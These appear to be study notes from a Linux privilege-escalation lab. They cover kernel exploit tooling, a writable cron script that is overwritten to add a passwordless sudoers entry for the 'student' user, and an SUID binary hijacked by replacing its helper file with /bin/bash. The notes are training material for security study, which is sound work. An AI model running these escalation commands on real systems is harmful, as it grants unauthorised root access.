1. identify the kernal version
2. downloading , compiling and transferring kernal exploits into the target system.
3. GitHub: https://github.com/mzet-/linux-exploit-suggester
4. Linpeas.sh

<h2>Cron tabs Misconfiguration</h2>
in linux terminal of target machine
```
crontab -l
find / -name messageorsuspeciousfile
ls -l thepathfrompreviouscommand

` This means there is some script/binary which is copying this file from the student **home** directory to **/tmp** directory. Search for that script. If this script is doing a simple copy operation, it must have the source destination of the file in it. Try to locate that by using the grep command. On trying on different directories one by one (i.e. /, etc, /opt) and on /usr directory, a match has been found.`


grep -rnw /usr -r "/home/student/suspeciousfileloation"
grep -nri "/tmp/message" /usr

\\ ths will lead to a .sh some file
```

the misconfiguration that a low level user in victim machine can edit crontab activity causes this.

```
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

```
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh  //they will not work
```



```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/location of .sh file
sudo -l
sudo su
```

we are using the crontab file and edit it into execute our code.

<h2>Exploiting SUID Binary</h2>
find files with SUID Binary enabled
```
find / -perm -4000 -type f 2>/dev/null
```
Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges.
```
file welcome
```

```
strings welcome
```
![[Pasted image 20250916120855.png]]
```
rm greetings
echo "/bin/bash" > greetings
```
